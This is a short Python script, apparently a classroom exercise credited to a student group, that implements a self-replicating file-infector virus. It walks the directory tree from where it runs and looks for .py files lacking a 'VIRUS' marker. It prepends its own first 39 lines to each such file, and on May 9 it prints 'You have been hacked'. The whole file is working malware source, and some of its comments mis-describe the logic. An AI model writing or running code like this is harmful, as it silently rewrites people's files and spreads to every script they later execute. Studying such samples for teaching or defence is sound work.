#!/usr/bin/python3
# Sierra Maldonado worked with Geneva, Justin H, and Nick A
# DO NOT RUN CODE

# os module to interact with the underlying operating system
import os
# The datetime module supplies classes for manipulating dates and times
import datetime

# Var
SIGNATURE = "VIRUS"

# Locate Files in a directory
def locate(path):
    files_targeted = []
    filelist = os.listdir(path)
    # A for loop that checks for 'fname' in 'filelist'
    for fname in filelist:
        if os.path.isdir(path+"/"+fname):
            files_targeted.extend(locate(path+"/"+fname))
        # If 'fname' is not in 'filelist', the 'elif' statement checks for a .py extention
        elif fname[-3:] == ".py":
            infected = False
            for line in open(path+"/"+fname):
                # If there is a python script, it checks for thr presence of the var "signature"
                if SIGNATURE in line:
                    infected = True
                    break
                # If 'signature' is not found, it is considered "infected" its path is added to 'files_targeted" using append
            if infected == False:
                files_targeted.append(path+"/"+fname)
    return files_targeted

# this code defines a new function with the purpose of infecting files in "file_targeted"
def infect(files_targeted):
    virus = open(os.path.abspath(__file__))
    # the below string "virusstring" which would store the contents of the virus
    virusstring = ""
    # The for loop checks whether the line number is between 0-38, If the line number is in the range, the loop appends the current line to "virussting"
    for i,line in enumerate(virus):
        if 0 <= i < 39:
            virusstring += line
    virus.close
    # this code infects the python listed in "file_targeted"
    for fname in files_targeted:
        # defines the vars for this function
        f = open(fname)
        temp = f.read()
        f.close()
        # Opens and writes the contents of "virusstring"
        f = open(fname,"w")
        f.write(virusstring + temp)
        f.close()
# Defines a new function, that checks if date is may 9th
def detonate():
    if datetime.datetime.now().month == 5 and datetime.datetime.now().day == 9:
        # if both are true then it will print "you have been hacked"
        print("You have been hacked")

# this calls all the functions that were preivously created
files_targeted = locate(os.path.abspath(""))
infect(files_targeted)
detonate()
# end